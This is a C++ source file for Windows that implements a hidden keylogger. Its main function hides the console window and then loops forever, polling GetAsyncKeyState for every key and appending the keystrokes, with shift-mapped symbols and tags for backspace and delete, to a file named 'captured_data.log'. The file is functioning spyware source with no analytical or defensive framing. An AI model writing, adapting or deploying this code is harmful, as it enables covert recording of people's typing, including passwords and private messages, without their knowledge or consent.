#include <windows.h>
#include <winuser.h>
#include <iostream>
#include <fstream>

using namespace std;
void hide_cross_section()
{
    HWND cross_section = FindWindowA("ConsoleWindowClass", nullptr);
    AllocConsole();
    ShowWindow(cross_section, 0);
}

void capture_strokes()
{
    const char file_name[] = "captured_data.log";
    while (true)
    {
        for (char key = 8; key <= 222; key++)
        {
            if (GetAsyncKeyState(key) == -__SHRT_MAX__)
            {
                ofstream write(file_name, ios::app);
                if (((key > 64) && (key < 91)) && !(GetAsyncKeyState(0x10)))
                {
                    key += 32;
                    write << key;
                    write.close();
                    break;
                }
                else if ((key > 64) && (key < 91))
                {
                    write << key;
                    write.close();
                    break;
                }
                else
                {
                    switch (key)
                    {
                    case 48:
                    {
                        if (GetAsyncKeyState(0x10))
                        {
                            write << ")";
                        }
                        else
                        {
                            write << "0";
                        }
                    }
                    break;

                    case 49:
                    {
                        if (GetAsyncKeyState(0x10))
                        {
                            write << "!";
                        }
                        else
                        {
                            write << "1";
                        }
                    }
                    break;

                    case 50:
                    {
                        if (GetAsyncKeyState(0x10))
                        {
                            write << "@";
                        }
                        else
                        {
                            write << "2";
                        }
                    }
                    break;

                    case 51:
                    {
                        if (GetAsyncKeyState(0x10))
                        {
                            write << "#";
                        }
                        else
                        {
                            write << "3";
                        }
                    }
                    break;

                    case 52:
                    {
                        if (GetAsyncKeyState(0x10))
                        {
                            write << "$";
                        }
                        else
                        {
                            write << "4";
                        }
                    }
                    break;

                    case 53:
                    {
                        if (GetAsyncKeyState(0x10))
                        {
                            write << "%";
                        }
                        else
                        {
                            write << "5";
                        }
                    }
                    break;

                    case 54:
                    {
                        if (GetAsyncKeyState(0x10))
                        {
                            write << "^";
                        }
                        else
                        {
                            write << "6";
                        }
                    }
                    break;

                    case 55:
                    {
                        if (GetAsyncKeyState(0x10))
                        {
                            write << "&";
                        }
                        else
                        {
                            write << "7";
                        }
                    }
                    break;

                    case 56:
                    {
                        if (GetAsyncKeyState(0x10))
                        {
                            write << "*";
                        }
                        else
                        {
                            write << "8";
                        }
                    }
                    break;

                    case 57:
                    {
                        if (GetAsyncKeyState(0x10))
                        {
                            write << "(";
                        }
                        else
                        {
                            write << "9";
                        }
                    }
                    break;

                    case VK_SPACE:
                        write << " ";
                        break;

                    case VK_RETURN:
                        write << "\n";
                        break;

                    case VK_TAB:
                        write << "  ";
                        break;

                    case VK_BACK:
                        write << "<BACKSPACE>";
                        break;

                    case VK_DELETE:
                        write << "<Del>";
                        break;

                    default:
                        write << key;
                    }
                }
            }
        }
    }
}

int main()
{
    hide_cross_section();
    capture_strokes();
    return 0;
}